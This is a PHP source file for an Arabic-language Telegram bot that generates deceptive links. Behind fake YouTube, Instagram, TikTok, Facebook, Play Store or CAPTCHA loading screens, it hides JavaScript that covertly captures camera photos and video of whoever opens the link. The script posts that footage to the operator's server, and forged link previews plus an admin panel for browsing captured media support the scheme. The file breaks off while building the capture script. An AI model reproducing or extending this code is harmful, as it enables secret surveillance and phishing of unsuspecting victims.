                  . "هذا البوت يساعدك على إنشاء روابط فريدة تحتوي على كود جافاسكريبت مخفي.\n"
                  . "يمكنك إعداد الرابط الأصلي، اختيار الإجراء الذي تريده، "
                  . "واختيار واجهة تحميل جذابة لإخفاء الكود.\n\n"
                  . "للبدء، يرجى استخدام القائمة بالأسفل:";
    sendMessage($chat_id, $welcome_text, showMainMenuKeyboard($chat_id));
}

function showMainMenuKeyboard($chat_id = null) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => "1. إعداد الرابط الأصلي 🔗", 'callback_data' => 'set_url']],
            [['text' => "2. اختيار الإجراء ✨", 'callback_data' => 'set_action']],
            [['text' => "3. اختيار واجهة التحميل 🎨", 'callback_data' => 'set_loading']],
            [['text' => "4. إنشاء الرابط 🚀", 'callback_data' => 'generate_link']],
            [['text' => "✉️ التواصل مع المطور", 'callback_data' => 'contact_developer']]
        ]
    ];
    if (isAdmin($chat_id)) {
        $keyboard['inline_keyboard'][] = [['text' => "⚙️ لوحة تحكم المسؤول", 'callback_data' => 'admin_panel']];
    }
    return json_encode($keyboard);
}

function showActionOptions($chat_id, $message_id) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '🎥 تسجيل فيديو سيلفي', 'callback_data' => 'action_choice:5']],
            [['text' => '🎥 تسجيل فيديو امامي', 'callback_data' => 'action_choice:7']],
            [['text' => '🎥 تسجيل فيديو بالكاميرتان', 'callback_data' => 'action_choice:8']],
            [['text' => '📸 التقاط صورة سيلفي', 'callback_data' => 'action_choice:9']],
            [['text' => '📸 التقاط صورة امامية', 'callback_data' => 'action_choice:10']],
            [['text' => '📸 التقاط صورة سيلفي ثم أمامية', 'callback_data' => 'action_choice:11']],
            [['text' => '🔙 العودة', 'callback_data' => 'main_menu']]
        ]
    ];
    editMessage($chat_id, $message_id, "💡 **الخطوة الثانية: اختيار الإجراء**\nالرجاء اختيار الإجراء الذي سيقوم به الكود:", json_encode($keyboard));
}

function showQualityOptions($chat_id, $message_id) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => 'جودة منخفضة (Low)', 'callback_data' => 'quality_choice:low']],
            [['text' => 'جودة متوسطة (Medium)', 'callback_data' => 'quality_choice:medium']],
            [['text' => 'جودة جيدة (Good)', 'callback_data' => 'quality_choice:good']],
            [['text' => 'جودة ممتازة (Excellent)', 'callback_data' => 'quality_choice:excellent']],
            [['text' => '🔙 العودة', 'callback_data' => 'set_action']]
        ]
    ];
    editMessage($chat_id, $message_id, "🌟 **الخطوة 2.5: اختيار الجودة**\nالرجاء اختيار جودة الصور/الفيديوهات الملتقطة:", json_encode($keyboard));
}

function showLoadingOptions($chat_id, $message_id) {
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '🌀 واجهة تحميل عادية', 'callback_data' => 'loading_choice:normal']],
            [['text' => '🤖 واجهة "أنا لست روبوت"', 'callback_data' => 'loading_choice:recaptcha']],
            [['text' => '▶️ واجهة تحميل يوتيوب', 'callback_data' => 'loading_choice:youtube']],
            [['text' => '📷 واجهة تحميل انستقرام', 'callback_data' => 'loading_choice:instagram']],
            [['text' => '🎵 واجهة تحميل تيكتوك', 'callback_data' => 'loading_choice:tiktok']],
            [['text' => '📘 واجهة تحميل فيسبوك', 'callback_data' => 'loading_choice:facebook']],
            [['text' => '▶️ واجهة تحميل متجر بلاي', 'callback_data' => 'loading_choice:playstore']],
            [['text' => '🔙 العودة', 'callback_data' => 'main_menu']]
        ]
    ];
    editMessage($chat_id, $message_id, "🎨 <b>الخطوة الثالثة: اختيار واجهة التحميل</b>\n\nالرجاء اختيار الواجهة التي ستظهر للمستخدم:", json_encode($keyboard));
}

function processUserChoices($chat_id, $text) {
    $state_file = getUserStateFile($chat_id, "state");
    $state_data = @file_get_contents($state_file);
    $state = explode(':', $state_data)[0];

    if ($state === 'waiting_for_url') {
        if (filter_var($text, FILTER_VALIDATE_URL)) {
            file_put_contents(getUserStateFile($chat_id, "url"), $text);
            sendMessage($chat_id, "✅ تم إعداد الرابط الأصلي بنجاح!\n\nيمكنك الآن اختيار الإجراء وواجهة التحميل من القائمة الرئيسية.");
            @unlink($state_file);
            showMainOptions($chat_id);
        } else {
            sendMessage($chat_id, "❌ الرابط الذي أدخلته غير صالح. الرجاء إدخال رابط صحيح (يبدأ بـ http:// أو https://).");
        }
    } else {
        sendMessage($chat_id, "📌 يرجى استخدام الأزرار في القائمة لإعداد الرابط.", showMainMenuKeyboard($chat_id));
    }
}

function showMainOptions($chat_id) {
    $keyboard = showMainMenuKeyboard($chat_id);
    sendMessage($chat_id, "✨ أهلاً بك في بوت إنشاء الروابط!\n\nاختر من القائمة بالأسفل لإعداد رابطك المخصص:", $keyboard);
}

function editMessageReplyMarkup($chat_id, $message_id, $data) {
    $parts = explode(':', $data);
    $action = $parts[0];

    $state_file = getUserStateFile($chat_id, "state");
    $action_file = getUserStateFile($chat_id, "action");
    $quality_file = getUserStateFile($chat_id, "quality");
    $loading_file = getUserStateFile($chat_id, "loading");

    switch ($action) {
        case 'set_url':
            file_put_contents($state_file, "waiting_for_url");
            $text = "💡 **الخطوة الأولى: إعداد الرابط**\nالرجاء إرسال الرابط الأصلي الذي تريد استخدامه.";
            $keyboard = ['inline_keyboard' => [[['text' => '🔙 العودة', 'callback_data' => 'main_menu']]]];
            editMessage($chat_id, $message_id, $text, json_encode($keyboard));
            break;
        case 'set_action':
            showActionOptions($chat_id, $message_id);
            break;
        case 'set_loading':
            showLoadingOptions($chat_id, $message_id);
            break;
        case 'generate_link':
            generateFinalLink($chat_id, $message_id);
            break;
        case 'action_choice':
            $choice = $parts[1];
            file_put_contents($action_file, $choice);
            showQualityOptions($chat_id, $message_id);
            break;
        case 'quality_choice':
            $choice = $parts[1];
            file_put_contents($quality_file, $choice);
            $text = "✅ تم اختيار الجودة بنجاح. الآن يمكنك اختيار واجهة التحميل أو إنشاء الرابط مباشرة.";
            editMessage($chat_id, $message_id, $text, showMainMenuKeyboard($chat_id));
            break;
        case 'loading_choice':
            $choice = $parts[1];
            file_put_contents($loading_file, $choice);
            $text = "✅ تم اختيار واجهة التحميل بنجاح. الآن يمكنك إنشاء الرابط.";
            editMessage($chat_id, $message_id, $text, showMainMenuKeyboard($chat_id));
            break;
        case 'main_menu':
            $text = "✨ أهلاً بك في بوت إنشاء الروابط!\n\nاختر من القائمة بالأسفل لإعداد رابطك المخصص:";
            editMessage($chat_id, $message_id, $text, showMainMenuKeyboard($chat_id));
            break;
        case 'contact_developer':
            file_put_contents($state_file, 'waiting_for_developer_message');
            $text = "✉️ **التواصل مع المطور**\nالرجاء إرسال رسالتك الآن وسأقوم بإيصالها للمطور.";
            $keyboard = ['inline_keyboard' => [[['text' => '🔙 إلغاء', 'callback_data' => 'main_menu']]]];
            editMessage($chat_id, $message_id, $text, json_encode($keyboard));
            break;
    }
}


// --- Admin Panel Functions ---

function listUsersForAdmin($admin_chat_id, $message_id, $list_type = 'allowed', $page = 0, $filtered_users = null) {
    if ($filtered_users === null) {
        $all_users = getAllBotUsers();
        $users_to_list = ($list_type === 'allowed') ? $all_users['allowed'] : $all_users['banned'];
    } else {
        $users_to_list = $filtered_users;
    }
    
    $total_items = count($users_to_list);
    $total_pages = ceil($total_items / ITEMS_PER_PAGE);
    $offset = $page * ITEMS_PER_PAGE;
    $users_on_page = array_slice($users_to_list, $offset, ITEMS_PER_PAGE, true);
    
    $text = ($list_type === 'allowed') ? "👥 **المستخدمون المسموح لهم:**\n\n" : "🚫 **المستخدمون المحظورون:**\n\n";

    if (empty($users_to_list)) {
        $text .= ($list_type === 'allowed') ? "(لا يوجد مستخدمون مسموح لهم حالياً)\n" : "(لا يوجد مستخدمون محظورون حالياً)\n";
        editMessage($admin_chat_id, $message_id, $text, showAdminPanelKeyboard());
        return;
    }
    
    $keyboard_buttons = [];
    foreach ($users_on_page as $id => $user_data) {
        $name = htmlspecialchars($user_data['first_name'] ?? 'N/A');
        $username = $user_data['username'] ? " (@" . htmlspecialchars($user_data['username']) . ")" : "";
        $keyboard_buttons[] = [['text' => "{$name}{$username} (ID: {$id})", 'callback_data' => "admin_user_details:{$id}:{$list_type}"]];
    }
    
    $nav_buttons = [];
    if ($page > 0) {
        $nav_buttons[] = ['text' => '◀️', 'callback_data' => "admin_list_users:{$list_type}:" . ($page - 1)];
    }
    $nav_buttons[] = ['text' => "{$page}/" . ($total_pages - 1), 'callback_data' => "ignore_page_nav"];
    if (($page + 1) * ITEMS_PER_PAGE < $total_items) {
        $nav_buttons[] = ['text' => '▶️', 'callback_data' => "admin_list_users:{$list_type}:" . ($page + 1)];
    }
    if (!empty($nav_buttons)) {
        $keyboard_buttons[] = $nav_buttons;
    }

    $keyboard_buttons[] = [
        ['text' => '🔎 بحث متقدم', 'callback_data' => 'admin_search_users_prompt'],
        ['text' => '🔙 العودة للوحة التحكم', 'callback_data' => 'admin_panel']
    ];
    
    editMessage($admin_chat_id, $message_id, $text, json_encode(['inline_keyboard' => $keyboard_buttons]));
}

function handleAdminUserSearch($admin_chat_id, $query) {
    $query = mb_strtolower(trim($query), 'UTF-8');
    $all_users = array_merge(loadAllowedUsers(), loadBannedUsers());
    
    $filtered_users = [];
    foreach ($all_users as $id => $user_data) {
        $first_name = mb_strtolower($user_data['first_name'] ?? '', 'UTF-8');
        $username = mb_strtolower($user_data['username'] ?? '', 'UTF-8');
        
        if (strpos((string)$id, $query) !== false || strpos($first_name, $query) !== false || strpos($username, $query) !== false) {
            $filtered_users[$id] = $user_data;
        }
    }

    $text = "🔍 **نتائج البحث عن '{$query}'**\n\n";

    if (empty($filtered_users)) {
        $text .= "⚠️ لم يتم العثور على مستخدمين يطابقون كلمة البحث.";
        $keyboard_buttons = [['text' => '🔙 العودة لقائمة المستخدمين', 'callback_data' => 'admin_list_allowed_users']];
        editMessage($admin_chat_id, null, $text, json_encode(['inline_keyboard' => [$keyboard_buttons]]));
        return;
    }
    
    listUsersForAdmin($admin_chat_id, null, 'search_results', 0, $filtered_users);
}

function showUserDetailsForAdmin($admin_chat_id, $message_id, $target_chat_id, $context) {
    $user_data = loadAllowedUsers()[$target_chat_id] ?? loadBannedUsers()[$target_chat_id] ?? null;

    if (!$user_data) {
        editMessage($admin_chat_id, $message_id, "⚠️ لم يتم العثور على معلومات المستخدم <code>{$target_chat_id}</code>.", showAdminPanelKeyboard());
        return;
    }

    $is_banned = isUserBanned($target_chat_id);

    $text = "ℹ️ **تفاصيل المستخدم:**\n\n";
    $text .= "<b>ID:</b> <code>{$target_chat_id}</code>\n";
    $text .= "<b>الاسم:</b> " . htmlspecialchars($user_data['first_name'] ?? 'N/A') . "\n";
    $text .= "<b>اليوزر:</b> " . ($user_data['username'] ? "@" . htmlspecialchars($user_data['username']) : "غير متاح") . "\n";
    if ($is_banned) {
        $text .= "<b>الحالة:</b> 🚫 محظور\n";
        $text .= "<b>تاريخ الحظر:</b> " . htmlspecialchars($user_data['banned_at'] ?? 'N/A') . "\n";
    } else {
        $text .= "<b>الحالة:</b> ✅ مسموح له\n";
        $text .= "<b>آخر نشاط:</b> " . htmlspecialchars($user_data['last_seen'] ?? 'N/A') . "\n";
    }

    editMessage($admin_chat_id, $message_id, $text, showUserDetailsKeyboard($target_chat_id, $context));
}

function showUserDetailsKeyboard($target_chat_id, $context) {
    $is_banned = isUserBanned($target_chat_id);
    $keyboard_buttons = [];

    if ((string)$target_chat_id !== (string)ADMIN_CHAT_ID) {
        if ($is_banned) {
            $keyboard_buttons[] = [['text' => '✅ إلغاء حظر المستخدم', 'callback_data' => "admin_unban_specific_user:{$target_chat_id}"]];
        } else {
            $keyboard_buttons[] = [['text' => '🚫 حظر المستخدم', 'callback_data' => "admin_ban_specific_user:{$target_chat_id}"]];
        }
    }
    
    if (!$is_banned) {
        $keyboard_buttons[] = [['text' => '✉️ إرسال رسالة مباشرة', 'callback_data' => "admin_send_message_to_user_prompt:{$target_chat_id}"]];
    }
    
    $keyboard_buttons[] = [['text' => '🔗 عرض الروابط والبيانات', 'callback_data' => "admin_view_user_links_and_media:{$target_chat_id}"]];

    $back_callback = ($context === 'banned') ? 'admin_list_banned_users' : 'admin_list_allowed_users';
    $keyboard_buttons[] = [['text' => '🔙 العودة لقائمة المستخدمين', 'callback_data' => $back_callback]];

    return json_encode(['inline_keyboard' => $keyboard_buttons]);
}

function showAdminPanel($chat_id, $message_id = null) {
    $maintenance_status = isMaintenanceMode() ? "✅ مفعل" : "❌ معطل";
    $text = "✨ **لوحة تحكم المسؤول**\n\nحالة وضع الصيانة: {$maintenance_status}\n\nاختر من الخيارات أدناه:";
    if ($message_id) {
        editMessage($chat_id, $message_id, $text, showAdminPanelKeyboard());
    } else {
        sendMessage($chat_id, $text, showAdminPanelKeyboard());
    }
}

function showAdminPanelKeyboard() {
    $maintenance_button_text = isMaintenanceMode() ? '🛠️ إلغاء وضع الصيانة' : '🛠️ تفعيل وضع الصيانة';
    $keyboard = [
        'inline_keyboard' => [
            [['text' => '👥 المستخدمون المسموح لهم', 'callback_data' => 'admin_list_users:allowed:0']],
            [['text' => '🚫 المستخدمون المحظورون', 'callback_data' => 'admin_list_users:banned:0']],
            [['text' => '✉️ بث رسالة', 'callback_data' => 'admin_broadcast_message_prompt']],
            [['text' => '📋 عرض كل الروابط', 'callback_data' => 'admin_view_links_page:0']],
            [['text' => '🗑️ حذف الروابط القديمة', 'callback_data' => 'admin_delete_old_links_prompt']],
            [['text' => '📊 إحصائيات البوت', 'callback_data' => 'admin_bot_stats']],
            [['text' => $maintenance_button_text, 'callback_data' => 'admin_toggle_maintenance']],
            [['text' => '🔙 القائمة الرئيسية', 'callback_data' => 'main_menu']]
        ]
    ];
    return json_encode($keyboard);
}

function broadcastMessageToAllAllowedUsers($admin_chat_id, $message_to_send) {
    $allowed_users = loadAllowedUsers();
    $sent_count = 0;
    $failed_count = 0;
    foreach ($allowed_users as $chat_id => $user_data) {
        if ((string)$chat_id === (string)$admin_chat_id) {
            continue;
        }
        $response = sendMessage($chat_id, $message_to_send);
        if ($response['http_code'] == 200) {
            $sent_count++;
        } else {
            $failed_count++;
        }
    }
    sendMessage($admin_chat_id, "✅ تم بث الرسالة بنجاح إلى {$sent_count} مستخدم.\n❌ فشل إرسال إلى {$failed_count} مستخدم.");
}

function listGeneratedLinksForAdmin($admin_chat_id, $message_id, $page = 0) {
    $all_files = glob(GENERATED_LINKS_DIR . 'link_owner_*.html');

    if (empty($all_files)) {
        editMessage($admin_chat_id, $message_id, "لا توجد روابط منشأة حتى الآن.", showAdminPanelKeyboard());
        return;
    }

    $links_info = [];
    foreach ($all_files as $file) {
        $filename = basename($file);
        preg_match('/link_owner_(\d+)_([a-f0-9]+)\.html/', $filename, $matches);
        $owner_id = $matches[1] ?? 'غير معروف';
        $link_hash = $matches[2] ?? 'N/A';
        
        $creation_time = filemtime($file);
        $owner_data = loadAllowedUsers()[$owner_id] ?? (loadBannedUsers()[$owner_id] ?? ['first_name' => 'Unknown', 'username' => null]);
        $owner_name = htmlspecialchars($owner_data['first_name'] . ($owner_data['username'] ? " (@" . $owner_data['username'] . ")" : ""));

        $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
        $base_url .= $_SERVER['HTTP_HOST'];
        $script_dir = dirname($_SERVER['REQUEST_URI']);
        $full_url = rtrim($base_url . $script_dir, '/') . '/' . basename($file);

        $links_info[] = [
            'url' => $full_url,
            'owner_id' => $owner_id,
            'owner_name' => $owner_name,
            'created_at' => date('Y-m-d H:i:s', $creation_time),
            'link_hash' => $link_hash
        ];
    }
    usort($links_info, function($a, $b) {
        return strtotime($b['created_at']) - strtotime($a['created_at']);
    });
    
    $total_items = count($links_info);
    $total_pages = ceil($total_items / ITEMS_PER_PAGE);
    $offset = $page * ITEMS_PER_PAGE;
    $links_on_page = array_slice($links_info, $offset, ITEMS_PER_PAGE);

    $text_parts = ["📋 **جميع الروابط المنشأة:**\n\n"];
    $base_media_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
    $base_media_url .= $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['REQUEST_URI']), '/') . '/'. GENERATED_LINKS_DIR;

    foreach ($links_on_page as $link) {
        $text_parts[] = "🔗 <a href=\"" . htmlspecialchars($link['url']) . "\">الرابط</a>\n";
        $text_parts[] = "<b>المالك:</b> " . $link['owner_name'] . " (<code>{$link['owner_id']}</code>)\n";
        $text_parts[] = "<b>تاريخ الإنشاء:</b> {$link['created_at']}\n";

        $media_files = glob(GENERATED_LINKS_DIR . "*{_}{$link['link_hash']}_*.{webm,jpg}", GLOB_BRACE);
        if (!empty($media_files)) {
            $text_parts[] = "  **البيانات الملتقطة:**\n";
            foreach ($media_files as $media_file) {
                $media_filename = basename($media_file);
                $media_type = (strpos($media_filename, 'video_') === 0) ? '🎥 فيديو' : '📸 صورة';
                $text_parts[] = "  - {$media_type}: <a href=\"" . htmlspecialchars($base_media_url . $media_filename) . "\">تحميل</a>\n";
            }
        } else {
            $text_parts[] = "  (لا توجد بيانات ملتقطة لهذا الرابط حتى الآن)\n";
        }
        $text_parts[] = "-----------------------------------\n";
    }

    $full_text = implode("", $text_parts);

    $keyboard_buttons = [];
    $nav_buttons = [];
    if ($page > 0) {
        $nav_buttons[] = ['text' => '◀️', 'callback_data' => "admin_view_links_page:" . ($page - 1)];
    }
    $nav_buttons[] = ['text' => "{$page}/" . ($total_pages - 1), 'callback_data' => "ignore_page_nav"];
    if (($page + 1) * ITEMS_PER_PAGE < $total_items) {
        $nav_buttons[] = ['text' => '▶️', 'callback_data' => "admin_view_links_page:" . ($page + 1)];
    }
    if (!empty($nav_buttons)) {
        $keyboard_buttons[] = $nav_buttons;
    }
    $keyboard_buttons[] = [['text' => '🔙 العودة للوحة التحكم', 'callback_data' => 'admin_panel']];
    
    editMessage($admin_chat_id, $message_id, $full_text, json_encode(['inline_keyboard' => $keyboard_buttons]));
}

function listUserGeneratedLinksAndMedia($admin_chat_id, $message_id, $target_chat_id) {
    $links_info = [];
    $files = glob(GENERATED_LINKS_DIR . "link_owner_{$target_chat_id}_*.html");

    if (empty($files)) {
        editMessage($admin_chat_id, $message_id, "لا توجد روابط منشأة بواسطة المستخدم <code>{$target_chat_id}</code> حتى الآن.", showUserDetailsKeyboard($target_chat_id, 'allowed'));
        return;
    }

    foreach ($files as $file) {
        $filename = basename($file);
        preg_match('/link_owner_(\d+)_([a-f0-9]+)\.html/', $filename, $matches);
        $owner_id = $matches[1] ?? 'غير معروف';
        $link_hash = $matches[2] ?? 'N/A';
        
        $creation_time = filemtime($file);
        
        $base_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
        $base_url .= $_SERVER['HTTP_HOST'];
        $script_dir = dirname($_SERVER['REQUEST_URI']);
        $full_url = rtrim($base_url . $script_dir, '/') . '/' . basename($file);

        $links_info[] = [
            'url' => $full_url,
            'created_at' => date('Y-m-d H:i:s', $creation_time),
            'link_hash' => $link_hash
        ];
    }

    usort($links_info, function($a, $b) {
        return strtotime($b['created_at']) - strtotime($a['created_at']);
    });

    $text_parts = ["🔗 **روابط وبيانات المستخدم <code>{$target_chat_id}</code>:**\n\n"];
    $base_media_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://";
    $base_media_url .= $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['REQUEST_URI']), '/') . '/'. GENERATED_LINKS_DIR;

    foreach ($links_info as $link) {
        $text_parts[] = "🔸 **الرابط:** <a href=\"" . htmlspecialchars($link['url']) . "\">" . htmlspecialchars($link['url']) . "</a>\n";
        $text_parts[] = "<b>تاريخ الإنشاء:</b> {$link['created_at']}\n";

        $media_files = glob(GENERATED_LINKS_DIR . "*{_}{$link['link_hash']}_*.{webm,jpg}", GLOB_BRACE);
        if (!empty($media_files)) {
            $text_parts[] = "  **البيانات الملتقطة:**\n";
            foreach ($media_files as $media_file) {
                $media_filename = basename($media_file);
                $media_type = (strpos($media_filename, 'video_') === 0) ? '🎥 فيديو' : '📸 صورة';
                $text_parts[] = "  - {$media_type}: <a href=\"" . htmlspecialchars($base_media_url . $media_filename) . "\">تحميل</a>\n";
            }
        } else {
            $text_parts[] = "  (لا توجد بيانات ملتقطة لهذا الرابط)\n";
        }
        $text_parts[] = "-----------------------------------\n";
    }
    
    $full_text = implode("", $text_parts);
    
    handleLongMessage($admin_chat_id, $message_id, $full_text, 'user_details:' . $target_chat_id);
}

function deleteOldLinks($admin_chat_id, $days) {
    $deleted_count = 0;
    $errors = [];
    $files = glob(GENERATED_LINKS_DIR . '*.html');
    $cutoff_timestamp = time() - ($days * 24 * 60 * 60);

    foreach ($files as $file) {
        $file_mtime = filemtime($file);
        if ($file_mtime !== false && ($days == 0 || $file_mtime < $cutoff_timestamp)) {
            if (unlink($file)) {
                $deleted_count++;
            } else {
                $errors[] = basename($file);
            }
        }
    }

    $response_text = "✅ تم حذف {$deleted_count} رابط بنجاح.";
    if (!empty($errors)) {
        $response_text .= "\n❌ فشل حذف الروابط التالية:\n" . implode("\n", $errors);
    }
    sendMessage($admin_chat_id, $response_text);
}

function showBotStatsForAdmin($admin_chat_id, $message_id) {
    $total_allowed_users = count(loadAllowedUsers());
    $total_banned_users = count(loadBannedUsers());
    $total_links = count(glob(GENERATED_LINKS_DIR . 'link_owner_*.html'));
    $total_media_files = count(glob(GENERATED_LINKS_DIR . '*{video_*,photo_*}*.{webm,jpg}', GLOB_BRACE));
    $maintenance_status = isMaintenanceMode() ? "✅ مفعل" : "❌ معطل";
    
    $text = "📊 **إحصائيات البوت:**\n\n" .
            "<b>إجمالي المستخدمين المسموح لهم:</b> {$total_allowed_users}\n" .
            "<b>إجمالي المستخدمين المحظورين:</b> {$total_banned_users}\n" .
            "<b>إجمالي الروابط المنشأة:</b> {$total_links}\n" .
            "<b>إجمالي ملفات الميديا الملتقطة:</b> {$total_media_files}\n" .
            "<b>وضع الصيانة:</b> {$maintenance_status}\n";

    editMessage($admin_chat_id, $message_id, $text, showAdminPanelKeyboard());
}

function toggleMaintenanceMode($admin_chat_id, $message_id) {
    $current_status = isMaintenanceMode();
    $new_status = !$current_status;
    setMaintenanceMode($new_status);

    $status_text = $new_status ? "تفعيل" : "إلغاء تفعيل";
    sendMessage($admin_chat_id, "✅ تم {$status_text} وضع الصيانة بنجاح. البوت الآن " . ($new_status ? "قيد الصيانة." : "يعمل بشكل طبيعي."));
    showAdminPanel($admin_chat_id, $message_id);
}


// --- Link Generation Logic ---

function generateFinalLink($chat_id, $message_id) {
    $original_url = @file_get_contents(getUserStateFile($chat_id, "url"));
    $action_choice = @file_get_contents(getUserStateFile($chat_id, "action"));
    $quality_choice = @file_get_contents(getUserStateFile($chat_id, "quality"));
    $loading_type = @file_get_contents(getUserStateFile($chat_id, "loading"));

    if (!$quality_choice) {
        $quality_choice = 'medium';
        file_put_contents(getUserStateFile($chat_id, "quality"), $quality_choice);
    }

    $owner_user_data = loadAllowedUsers()[$chat_id] ?? ['first_name' => 'Unknown User', 'username' => null];
    $owner_display_name = htmlspecialchars($owner_user_data['first_name'] . ($owner_user_data['username'] ? " (@" . $owner_user_data['username'] . ")" : ""));

    if (!$original_url || !$action_choice || !$loading_type) {
        $text = "⚠️ يرجى إعداد جميع الخيارات (الرابط، الإجراء، الواجهة) قبل إنشاء الرابط.";
        editMessage($chat_id, $message_id, $text, showMainMenuKeyboard($chat_id));
        return;
    }

    // --- CORRECTED: Use SCRIPT_NAME for accurate PHP script URL ---
    $php_script_url = getScriptUrl();
    
    $link_hash = md5($original_url . $action_choice . $loading_type . $chat_id . microtime());

    // --- Open Graph Meta Tags Generation ---
    $og_meta_tags = '';
    
    $fetched_og_data = fetchOgMetaTags($original_url);

    $og_title = htmlspecialchars($fetched_og_data['og:title'] ?? 'محتوى مميز في انتظارك!', ENT_QUOTES | ENT_HTML5, 'UTF-8');
    $og_description = htmlspecialchars($fetched_og_data['og:description'] ?? 'انقر لمتابعة المحتوى الحصري.', ENT_QUOTES | ENT_HTML5, 'UTF-8');
    $og_image = htmlspecialchars($fetched_og_data['og:image'] ?? DEFAULT_THUMBNAIL_URL, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    $og_url = htmlspecialchars($fetched_og_data['og:url'] ?? $original_url, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    $og_type = htmlspecialchars($fetched_og_data['og:type'] ?? 'website', ENT_QUOTES | ENT_HTML5, 'UTF-8');

    $video_id = null;
    if (preg_match('/(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|\S*?[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/', $original_url, $matches)) {
        $video_id = $matches[1];
    } elseif (preg_match('/youtube\.com\/shorts\/([a-zA-Z0-9_-]{11})/', $original_url, $matches)) {
        $video_id = $matches[1];
    }

    if ($video_id) {
        $youtube_thumbnail_url = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
        $og_title = htmlspecialchars($fetched_og_data['og:title'] ?? 'مشاهدة الفيديو على YouTube', ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $og_description = htmlspecialchars($fetched_og_data['og:description'] ?? 'انقر لمشاهدة هذا الفيديو المثير على YouTube.', ENT_QUOTES | ENT_HTML5, 'UTF-8');
        $og_image = $youtube_thumbnail_url;
        $og_type = 'video.other';
        $og_meta_tags = "
            <meta property=\"og:title\" content=\"{$og_title}\">
            <meta property=\"og:description\" content=\"{$og_description}\">
            <meta property=\"og:image\" content=\"{$og_image}\">
            <meta property=\"og:image:width\" content=\"480\">
            <meta property=\"og:image:height\" content=\"360\">
            <meta property=\"og:type\" content=\"{$og_type}\">
            <meta property=\"og:video:url\" content=\"{$original_url}\">
            <meta property=\"og:video:type\" content=\"text/html\">
            <meta property=\"og:url\" content=\"{$og_url}\">
            <meta name=\"twitter:card\" content=\"player\">
            <meta name=\"twitter:site\" content=\"@youtube\">
            <meta name=\"twitter:url\" content=\"{$og_url}\">
            <meta name=\"twitter:title\" content=\"{$og_title}\">
            <meta name=\"twitter:description\" content=\"{$og_description}\">
            <meta name=\"twitter:image\" content=\"{$og_image}\">
            <meta name=\"twitter:app:id:iphone\" content=\"544007664\">
            <meta name=\"twitter:app:id:ipad\" content=\"544007664\">
            <meta name=\"twitter:app:id:googleplay\" content=\"com.google.android.youtube\">
            <meta name=\"twitter:player\" content=\"https://www.youtube.com/embed/{$video_id}\">
            <meta name=\"twitter:player:width\" content=\"1280\">
            <meta name=\"twitter:player:height\" content=\"720\">
        ";
    } else {
        $og_meta_tags = "
            <meta property=\"og:title\" content=\"{$og_title}\">
            <meta property=\"og:description\" content=\"{$og_description}\">
            <meta property=\"og:image\" content=\"{$og_image}\">
            <meta property=\"og:type\" content=\"{$og_type}\">
            <meta property=\"og:url\" content=\"{$og_url}\">
            <meta name=\"twitter:card\" content=\"summary_large_image\">
            <meta name=\"twitter:title\" content=\"{$og_title}\">
            <meta name=\"twitter:description\" content=\"{$og_description}\">
            <meta name=\"twitter:image\" content=\"{$og_image}\">
        ";
    }

    $js_template_vars = [
        'original_url' => addslashes($original_url),
        'owner_chat_id' => $chat_id,
        'owner_username' => addslashes($owner_display_name),
        'php_script_url' => addslashes($php_script_url),
        'quality_choice' => $quality_choice,
        'generated_link_hash' => $link_hash
    ];

    // Common sendDataToPHP function with improved error handling
    $sendDataToPHP_function = <<<JS_FUNCTION
    async function sendDataToPHP(dataBlob, type) {
        const formData = new FormData();
        formData.append('ownerChatId', ownerChatId);
        formData.append('ownerUsername', ownerUsername);
        formData.append('original_url', original_url);
        formData.append('generatedLinkHash', generatedLinkHash);
        if (type === 'video') {
            formData.append('video', dataBlob, 'video.webm');
        } else if (type === 'photo') {
            formData.append('photo', dataBlob, 'photo.jpg');
        } else if (type === 'device_info') {
            formData.append('device_info', JSON.stringify(dataBlob));
        }

        try {
            console.log('Sending ' + type + ' to:', phpScriptUrl);
            console.log('Data size:', dataBlob.size || dataBlob.length || 'unknown');
            
            const response = await fetch(phpScriptUrl, {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            console.log('Server response:', result);
            
            if (!response.ok) {
                throw new Error('HTTP error: ' + response.status);
            }
            return result;
        } catch (error) {
            console.error('Error sending data to PHP:', error);
            // Still throw but log it for debugging
            throw error;
        }
    }
JS_FUNCTION;

    $video_constraints_js = <<<JS
    let videoResolution, videoBitrate, videoFrameRate, photoQuality, photoWidth, photoHeight;

    switch (quality_choice) {
        case 'low':
            videoResolution = { width: { max: 320 }, height: { max: 240 } };
            videoBitrate = 300000;
            videoFrameRate = { max: 10 };
            photoWidth = 640; photoHeight = 480; photoQuality = 0.6;
            break;
        case 'medium':
            videoResolution = { width: { ideal: 640 }, height: { ideal: 480 } };
            videoBitrate = 800000;
            videoFrameRate = { ideal: 15 };
            photoWidth = 960; photoHeight = 720; photoQuality = 0.75;
            break;
        case 'good':
            videoResolution = { width: { ideal: 960 }, height: { ideal: 720 } };
            videoBitrate = 1500000;
            videoFrameRate = { ideal: 20 };
            photoWidth = 1280; photoHeight = 960; photoQuality = 0.85;
            break;
        case 'excellent':
            videoResolution = { width: { ideal: 1280 }, height: { ideal: 720 } };
            videoBitrate = 2500000;
            videoFrameRate = { ideal: 25 };
            photoWidth = 1920; photoHeight = 1080; photoQuality = 0.95;
            break;
        default:
            videoResolution = { width: { ideal: 640 }, height: { ideal: 480 } };
            videoBitrate = 800000;
            videoFrameRate = { ideal: 15 };
            photoWidth = 960; photoHeight = 720; photoQuality = 0.75;
            break;
    }
JS;

    $javascript_code = '';
    
    // Generate JavaScript based on action choice with PERMISSION DENIAL HANDLING
